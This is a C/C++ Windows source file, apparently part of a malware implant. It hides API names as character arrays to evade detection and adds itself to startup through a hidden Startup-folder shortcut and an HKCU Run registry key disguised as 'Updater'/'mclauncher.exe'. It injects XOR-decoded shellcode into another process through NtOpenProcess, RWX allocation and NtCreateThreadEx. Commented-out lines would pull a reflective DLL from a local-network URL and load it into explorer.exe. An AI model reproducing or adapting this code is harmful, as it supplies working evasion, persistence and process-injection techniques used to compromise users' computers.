#include "pch.h"
#include <Windows.h>
#include <ShlObj.h>
#include <TlHelp32.h>
#include "headers.h"
#include "types.h"
#include "dll_headers.h"


static void to_tower_case_wide(wchar_t str[])
{
    size_t i = 0;
    while (str[i] != L'\0')
    {
        if (str[i] > L'A' && str[i] <= L'Z')
            str[i] = str[i] + 32; // covert uppercase to lowercase

        i++;
    }
}

typedef HANDLE(*CreateToolhelp32SnapshotFunc)(
    DWORD dwFlags,
    DWORD th32ProcessID
);

typedef BOOL (*Process32FirstFunc)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);

typedef BOOL (*Process32NextFunc)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);

int ret_pid_by_proc_name(wchar_t* proc_name)
{
    HANDLE proc_snap;
    PROCESSENTRY32 pe32;

    to_tower_case_wide(proc_name);

    CHAR str_Process32First[] = { 'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 'W', '\0' };
    CHAR str_Process32Next[] = { 'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 'W', '\0' };
    CHAR str_CreateToolhelp32Snapshot[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', '\0' };
    WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

    HMODULE k32_m = GMHR(str_Kernel32);
    if (k32_m == 0)
        return 0;
    CreateToolhelp32SnapshotFunc create_tool_help32_snapshot = (CreateToolhelp32SnapshotFunc)GPAR(k32_m, str_CreateToolhelp32Snapshot);
    Process32FirstFunc process32first = (Process32FirstFunc)GPAR(k32_m, str_Process32First);
    Process32NextFunc process32next = (Process32NextFunc)GPAR(k32_m, str_Process32Next);

    // take a snapshot of all processes in the system.
    proc_snap = create_tool_help32_snapshot(TH32CS_SNAPPROCESS, 0);
    if (proc_snap == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    // set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // retrieve information about the first process and exit if unsuccessful.
    if (!process32first(proc_snap, &pe32))
    {
        CloseHandle(proc_snap);
        return 0;
    }

    // display information about all processes in the snapshot.
    do
    {
        to_tower_case_wide(pe32.szExeFile);
        if (wcscmp((pe32.szExeFile), proc_name) == 0)
        {
            CloseHandle(proc_snap);
            return pe32.th32ProcessID;
        }

    } while (process32next(proc_snap, &pe32));

    CloseHandle(proc_snap);
    return 0;
}

static void custom_memcpy_classic(void* pDestination, const void* pSource, size_t sLength) {

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--) {

        *D++ = *S++;
    }


}

static size_t custom_wcslen(const wchar_t* str) {
    if (!str)
        return 0;

    size_t len = 0;

    while (str[len] != L'\0') {
        len++;
    }

    return len++;
}


int create_shortcut(ole32_functions_t* ole32)
{
    HRESULT hresult;
    int status;
    IShellLink* psl = NULL;
    IPersistFile* ppf = NULL;


    WCHAR startupPath[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        return ST_ERROR;
    }
    WCHAR str_msupdater_lnk[] = { '\\', 'm', 'c', 'l', 'a', 'u', 'n', 'c', 'h', 'e', 'r', '.', 'l', 'n', 'k', L'\0' };
    custom_memcpy_classic(startupPath + custom_wcslen(startupPath), str_msupdater_lnk, sizeof(str_msupdater_lnk));


    WCHAR appDataPath[MAX_PATH] = { 0 };
    //WCHAR str_arguments[] = { '-', 'u', ' ', 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '1', '1', '.', '1', ':', '8', '0', '0', '0', '/', 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'D', 'L', 'L', '.', 'd', 'l', 'l', ' ', '-', 'p', ' ', 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
    WCHAR str_msupdater[] = { L'\\', 'M', 'C', 'L', 'a', 'u', 'n', 'c', 'h', 'e', 'r',  L'\\', 'm', 'c', 'l', 'a', 'u', 'n', 'c', 'h', 'e', 'r', '.', 'e', 'x', 'e', L'\0'};
    WCHAR str_commandline[MAX_PATH << 1] = { 0 };

    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return ST_ERROR;
    }

    custom_memcpy_classic(str_commandline, appDataPath, custom_wcslen(appDataPath) << 1);
    custom_memcpy_classic(str_commandline + custom_wcslen(str_commandline), str_msupdater, sizeof(str_msupdater));

    //int pos = custom_wcslen(str_commandline);
    //str_commandline[pos] = L' ';
    //custom_memcpy_classic(str_commandline + custom_wcslen(str_commandline), str_arguments, sizeof(str_arguments));

    if (GetFileAttributesW(appDataPath) == INVALID_FILE_ATTRIBUTES)
    {
        return ST_ERROR;
    }



    hresult = ole32->CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hresult))
    {
        return ST_ERROR;
    }

    hresult = ole32->CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hresult))
    {
        psl->SetPath(str_commandline);
        //psl->SetArguments(str_arguments);
        psl->SetShowCmd(SW_HIDE);
        
        hresult = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hresult))
        {
            hresult = ppf->Save(startupPath, TRUE);
            ppf->Release();
        }
    }
    psl->Release();

    return ST_SUCCESS;
}


int add_to_startup()
{
    HKEY key;

    WCHAR appDataPath[MAX_PATH] = { 0 };
    //WCHAR str_arguments[] = { '-', 'u', ' ', 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '1', '1', '.', '1', ':', '8', '0', '0', '0', '/', 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'D', 'L', 'L', '.', 'd', 'l', 'l', ' ', '-', 'p', ' ', 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
    WCHAR str_msupdater[] = { L'\\', 'M', 'C', 'L', 'a', 'u', 'n', 'c', 'h', 'e', 'r',  L'\\', 'm', 'c', 'l', 'a', 'u', 'n', 'c', 'h', 'e', 'r', '.', 'e', 'x', 'e', L'\0'};
    WCHAR str_commandline[MAX_PATH] = { 0 };

    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return ST_ERROR;
    }

    str_commandline[0] = L'"';
    custom_memcpy_classic(str_commandline + 1, appDataPath, custom_wcslen(appDataPath) << 1);
    custom_memcpy_classic(str_commandline + custom_wcslen(str_commandline), str_msupdater, sizeof(str_msupdater));
    int pos = custom_wcslen(str_commandline);
    str_commandline[pos++] = L'"';
    str_commandline[pos] = L' ';
    //custom_memcpy_classic(str_commandline + custom_wcslen(str_commandline), str_arguments, sizeof(str_arguments));

    if (GetFileAttributesW(appDataPath) == INVALID_FILE_ATTRIBUTES)
    {
        return ST_ERROR;
    }
    
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &key
    );
    if (result != ERROR_SUCCESS) {
        return ST_ERROR;
    }

    result = RegSetValueExW(
        key,
        L"Updater",
        0,
        REG_SZ,
        (const BYTE*)str_commandline,
        (DWORD)((custom_wcslen(str_commandline) << 1) + 2)
    );

    if (result != ERROR_SUCCESS)
        return ST_ERROR;
    
    return ST_SUCCESS;


}

int inject(PNT_FUNCTIONS nt, WCHAR* procname)
{

    BYTE shellcode[] = { 0x90, 0x90 };

    int status = 0;

    int target_pid = ret_pid_by_proc_name(procname);

    HANDLE proc_h = 0;
    CLIENT_ID client_id = { (HANDLE)target_pid, 0 };

    OBJECT_ATTRIBUTES obj_attr = { 0 };
    obj_attr.Length = sizeof OBJECT_ATTRIBUTES;

    UINT64 desired_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

    status = nt->NtOpenProcess(&proc_h, desired_access, &obj_attr, client_id);
    if (status != STATUS_SUCCESS)
        return -1;

    SIZE_T shellcode_size = sizeof(shellcode);
    SIZE_T allocated_shellcode_size = 0;
    allocated_shellcode_size = sizeof(shellcode);
    BYTE* local_addr = 0;
    status = nt->NtAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), (PVOID*)&local_addr, 0, &allocated_shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS || local_addr == 0)
        return -1;

    for (int i = 0; i < shellcode_size; i++)
        local_addr[i] = shellcode[i] ^ 0x53;


    PVOID remote_addr = 0;

    allocated_shellcode_size = sizeof(shellcode);
    status = nt->NtAllocateVirtualMemory(proc_h, &remote_addr, 0, &allocated_shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS || remote_addr == 0)
        return -1;

    SIZE_T bytestowritten;
    status = nt->NtWriteVirtualMemory(proc_h, remote_addr, local_addr, shellcode_size, &bytestowritten);
    if (status != STATUS_SUCCESS || bytestowritten != shellcode_size)
        return -1;

    HANDLE thread_handle = 0;
    status = nt->NtCreateThreadEx(&thread_handle, THREAD_ALL_ACCESS, NULL, proc_h, (PUSER_THREAD_START_ROUTINE)remote_addr, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS)
        return -1;
            
    return ST_SUCCESS;
}